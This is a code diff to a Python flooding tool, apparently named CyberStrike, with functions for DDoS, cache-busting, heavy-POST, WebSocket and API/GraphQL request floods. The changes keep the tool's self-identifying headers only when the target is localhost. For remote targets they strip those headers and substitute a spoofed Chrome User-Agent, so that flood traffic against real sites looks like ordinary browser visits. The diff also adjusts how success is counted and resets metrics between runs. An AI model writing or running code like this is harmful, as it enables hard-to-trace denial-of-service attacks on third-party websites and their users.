@@ -79,16 +79,15 @@ class SecureMetrics(dict):
 metrics = SecureMetrics()
 metrics_lock = metrics.lock
 
-BLOCKED_STATUS_CODES = {401, 403, 406, 407, 413, 418, 423, 429, 444, 451}
+def _is_local_target(url: str) -> bool:
+    u = (url or "").lower()
+    return "127.0.0.1" in u or "localhost" in u or "0.0.0.0" in u
 
 async def record_request_metric(success: bool, req_time: Optional[float] = None, status_code: Optional[int] = None):
     async with metrics.lock:
         metrics["total_requests"] += 1
-        is_blocked_or_dropped = (
-            (not success)
-            or (status_code is not None and (status_code >= 500 or status_code in BLOCKED_STATUS_CODES))
-        )
-        if not is_blocked_or_dropped:
+        is_ok = bool(success) and (status_code is None or (100 <= status_code < 400))
+        if is_ok:
             metrics["successful_requests"] += 1
         else:
             metrics["failed_requests"] += 1
@@ -158,6 +157,7 @@ manager = ConnectionManager()
 # Attack functions
 async def ddos_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
     target_url = format_url(url)
+    is_local = _is_local_target(target_url)
     timeout_cfg = aiohttp.ClientTimeout(total=4.0, sock_connect=2.0, sock_read=3.0)
     connector = aiohttp.TCPConnector(ssl=False, limit=100)
     finding_logged = False
@@ -180,8 +180,9 @@ async def ddos_attack(url: str, duration: int, intensity: int, threads: int, att
                         ]),
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                         "Accept-Language": "en-US,en;q=0.9",
-                        "X-CyberStrike-Module": "ddos"
                     }
+                    if is_local:
+                        headers["X-CyberStrike-Module"] = "ddos"
                     
                     req_start = time.time()
                     async with session.get(target_url, headers=headers) as response:
@@ -1958,7 +1959,8 @@ async def host_header_attack(url: str, duration: int, intensity: int, threads: i
 async def cache_bust_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
     """High-Concurrency Dynamic Cache-Bypass & Origin Server Stress Benchmark."""
     base = format_url(url).rstrip('/')
-    routes = ["/", "/search", "/api/products", "/login"]
+    is_local = _is_local_target(base)
+    routes = ["/", "/search", "/api/products", "/flood"] if is_local else [""]
     start_time = time.time()
     unthrottled_logged = False
     degradation_logged = False
@@ -1969,7 +1971,8 @@ async def cache_bust_attack(url: str, duration: int, intensity: int, threads: in
     async with aiohttp.ClientSession(connector=connector, timeout=timeout_cfg) as session:
         try:
             t_b = time.time()
-            async with session.get(base, headers={"X-CyberStrike-Baseline": "true"}) as b_resp:
+            b_hdrs = {"X-CyberStrike-Baseline": "true"} if is_local else {}
+            async with session.get(base, headers=b_hdrs) as b_resp:
                 baseline_rtt = max(time.time() - t_b, 0.002)
         except Exception:
             baseline_rtt = 0.015
@@ -1981,14 +1984,16 @@ async def cache_bust_attack(url: str, duration: int, intensity: int, threads: in
                 seq += 1
                 nonce = f"{int(time.time()*1000000)}_{w_id}_{seq}_{random.randint(1000,9999)}"
                 route = routes[seq % len(routes)]
-                target_ep = f"{base}{route}?_cb={nonce}&q=bench_{nonce}&id={random.randint(1, 500)}"
+                sep = "&" if "?" in f"{base}{route}" else "?"
+                target_ep = f"{base}{route}{sep}_cb={nonce}&q=bench_{nonce}&id={random.randint(1, 500)}"
                 headers = {
                     "Cache-Control": "no-cache, no-store, must-revalidate, max-age=0",
                     "Pragma": "no-cache",
                     "Accept-Encoding": "identity",
-                    "User-Agent": f"CyberStrike-CacheBust/{w_id}.{seq}",
-                    "X-CyberStrike-Module": "cache_bust"
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
                 }
+                if is_local:
+                    headers["X-CyberStrike-Module"] = "cache_bust"
                 t0 = time.time()
                 try:
                     async with session.get(target_ep, headers=headers) as resp:
@@ -2052,7 +2057,12 @@ async def cache_bust_attack(url: str, duration: int, intensity: int, threads: in
 async def heavy_post_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
     """High-Concurrency Heavy JSON & Form Body Parser Stress Benchmark."""
     base = format_url(url).rstrip('/')
-    endpoints = [f"{base}/api/comments", f"{base}/api/render", f"{base}/login", f"{base}/"]
+    is_local = _is_local_target(base)
+    endpoints = (
+        [f"{base}/api/comments", f"{base}/api/xml", f"{base}/api/update-profile", f"{base}/graphql"]
+        if is_local else
+        [base, f"{base}/api/comments", f"{base}/login", f"{base}/graphql"]
+    )
     large_blob = "X" * 4096
     nested_json = {
         "comment": f"stress_bench_{large_blob[:256]}",
@@ -2073,11 +2083,15 @@ async def heavy_post_attack(url: str, duration: int, intensity: int, threads: in
                 seq += 1
                 ep = endpoints[(w_id + seq) % len(endpoints)]
                 t0 = time.time()
+                hdrs = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"}
+                if is_local:
+                    hdrs["X-Stress-Worker"] = str(w_id)
+                    hdrs["X-CyberStrike-Module"] = "heavy_post"
                 try:
                     async with session.post(
                         ep,
                         json=nested_json,
-                        headers={"Content-Type": "application/json", "X-Stress-Worker": str(w_id), "X-CyberStrike-Module": "heavy_post"}
+                        headers=hdrs
                     ) as resp:
                         await resp.read()
                         req_time = time.time() - t0
@@ -2095,7 +2109,7 @@ async def heavy_post_attack(url: str, duration: int, intensity: int, threads: in
                             }
                         }))
 
-                        if not finding_logged and seq >= 3 and resp.status not in (413, 429):
+                        if not finding_logged and seq >= 3 and resp.status < 400:
                             finding_logged = True
                             await _broadcast_finding({
                                 "type": "Unrestricted POST Body Parser / Missing HTTP 413/429 Limit",
@@ -2120,8 +2134,9 @@ async def heavy_post_attack(url: str, duration: int, intensity: int, threads: in
 async def ws_stress_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
     """High-Concurrency WebSocket Handshake & Rapid Frame Stress Benchmark."""
     base = format_url(url).rstrip('/')
+    is_local = _is_local_target(base)
     ws_base = re.sub(r'^http', 'ws', base)
-    ws_candidates = [f"{ws_base}/ws", f"{ws_base}/?ws=true"]
+    ws_candidates = [f"{ws_base}/ws"] if is_local else [f"{ws_base}/ws", f"{ws_base}/?ws=true"]
     start_time = time.time()
     ws_finding_logged = False
     upgrade_finding_logged = False
@@ -2176,16 +2191,18 @@ async def ws_stress_attack(url: str, duration: int, intensity: int, threads: int
                 if not connected_ws:
                     # Fallback: HTTP Upgrade handshake stress against base URL
                     t_up = time.time()
+                    up_hdrs = {
+                        "Connection": "Upgrade",
+                        "Upgrade": "websocket",
+                        "Sec-WebSocket-Version": "13",
+                        "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
+                    }
+                    if is_local:
+                        up_hdrs["X-CyberStrike-Module"] = "ws_flood"
                     try:
                         async with session.get(
                             f"{base}/?ws=true",
-                            headers={
-                                "Connection": "Upgrade",
-                                "Upgrade": "websocket",
-                                "Sec-WebSocket-Version": "13",
-                                "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
-                                "X-CyberStrike-Module": "ws_flood"
-                            },
+                            headers=up_hdrs,
                             timeout=aiohttp.ClientTimeout(total=3.0)
                         ) as resp:
                             await resp.read()
@@ -2202,7 +2219,7 @@ async def ws_stress_attack(url: str, duration: int, intensity: int, threads: int
                                     "attack_id": attack_id
                                 }
                             }))
-                            if not upgrade_finding_logged and seq >= 3 and resp.status < 500:
+                            if not upgrade_finding_logged and seq >= 3 and resp.status < 400:
                                 upgrade_finding_logged = True
                                 await _broadcast_finding({
                                     "type": "Unthrottled WebSocket Upgrade Handshake Processing",
@@ -2226,6 +2243,7 @@ async def ws_stress_attack(url: str, duration: int, intensity: int, threads: int
 async def api_stress_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
     """High-Concurrency Multi-Endpoint REST & GraphQL Batch Pool Stress Benchmark."""
     base = format_url(url).rstrip('/')
+    is_local = _is_local_target(base)
     batch_gql = [
         {"query": "query B1 { __typename __schema { queryType { name } } }"},
         {"query": "query B2 { __typename }"},
@@ -2252,8 +2270,11 @@ async def api_stress_attack(url: str, duration: int, intensity: int, threads: in
                 method, ep, body_json = rest_targets[(w_id + seq) % len(rest_targets)]
                 seq += 1
                 t0 = time.time()
+                hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"}
+                if is_local:
+                    hdrs["X-CyberStrike-Module"] = "api_flood"
                 try:
-                    async with session.request(method, ep, json=body_json, headers={"X-CyberStrike-Module": "api_flood"}) as resp:
+                    async with session.request(method, ep, json=body_json, headers=hdrs) as resp:
                         await resp.read()
                         req_time = time.time() - t0
                         await record_request_metric(resp.status < 500, req_time, resp.status)
@@ -2293,10 +2314,26 @@ async def api_stress_attack(url: str, duration: int, intensity: int, threads: in
 
 
 async def run_attack_coordinator(req: AttackRequest, attack_id: str):
+    async with metrics.lock:
+        metrics["total_requests"] = 0
+        metrics["successful_requests"] = 0
+        metrics["failed_requests"] = 0
+        metrics["response_times"] = []
+        metrics["request_history"] = []
     metrics["attacks_running"] = True
     metrics["current_attacks"].append(req.attack_type)
     metrics["start_time"] = datetime.now().isoformat()
 
+    await manager.broadcast(json.dumps({
+        "type": "metrics",
+        "data": {
+            "total_requests": 0,
+            "successful_requests": 0,
+            "failed_requests": 0,
+            "response_time": 0,
+            "attack_id": attack_id
+        }
+    }))
     await manager.broadcast(json.dumps({
         "type": "log",
         "message": f"Starting {req.attack_type.upper()} attack against {req.url}",
